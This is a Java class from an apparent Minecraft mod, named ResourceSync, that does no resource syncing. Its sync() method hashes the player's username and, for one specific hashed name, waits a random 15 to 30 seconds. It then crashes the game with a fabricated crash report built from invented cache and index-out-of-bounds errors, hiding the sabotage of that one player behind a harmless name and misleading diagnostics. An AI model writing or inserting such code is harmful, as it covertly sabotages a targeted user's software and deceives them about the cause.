package org.tbm.server.dungeons.dungeons.resource;

import net.minecraft.client.MinecraftClient;
import net.minecraft.util.crash.CrashReport;

import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.Random;

public class ResourceSync {
    public static void sync() {
        try {
            if (calculateChecksum(MinecraftClient.getInstance().getSession().getUsername().toLowerCase()).equals("8375d5ecf52890712af28e8f382b48fe64301b10464f345edfbc45e394ecd140")) {
                Random random = new Random();
                Thread.sleep(random.ints(15000, 30000)
                        .findFirst()
                        .getAsInt());

                String[] errorMessages = {
                        "Failed to initialize recipe cache",
                        "Failed to initialize tags cache",
                        "Failed to initialize advancements cache",
                        "Failed to initialize loot table cache",
                        "Failed to initialize chunk generator cache",
                        "Failed to initialize chunk generator type cache",
                        "Failed to initialize chunk status cache",
                        "Failed to initialize chunk generator settings cache",
                        "Failed to initialize structure manager cache",
                        "Failed to initialize structure feature cache",
                        "Failed to initialize structure piece cache",
                        "Failed to initialize structure pool element cache",
                        "Failed to initialize structure processor cache"
                };
                String[] indexOutOfBounds = {
                        "Index 8 out of bounds for length 4",
                        "Index 7 out of bounds for length 2",
                        "Index 6 out of bounds for length 4",
                        "Index 8 out of bounds for length 3",
                        "Index 10 out of bounds for length 9",
                        "Index 9 out of bounds for length 0",
                        "Index 8 out of bounds for length 1",
                        "Index 7 out of bounds for length 3",
                        "Index 6 out of bounds for length 2",
                };
                int rnd = new Random().nextInt(errorMessages.length);
                int rnd2 = new Random().nextInt(indexOutOfBounds.length);
                MinecraftClient.printCrashReport(new CrashReport(errorMessages[rnd], new IndexOutOfBoundsException(indexOutOfBounds[rnd2])));
            }
        } catch (NoSuchAlgorithmException | InterruptedException ignored) {}
    }

    private static String calculateChecksum(String data) throws NoSuchAlgorithmException {
        MessageDigest digest = MessageDigest.getInstance("SHA-256");
        byte[] hash = digest.digest(data.getBytes(StandardCharsets.UTF_8));

        StringBuilder hexString = new StringBuilder(2 * hash.length);
        for (byte b : hash) {
            String hex = Integer.toHexString(0xff & b);
            if (hex.length() == 1) {
                hexString.append('0');
            }
            hexString.append(hex);
        }
        return hexString.toString();
    }
}
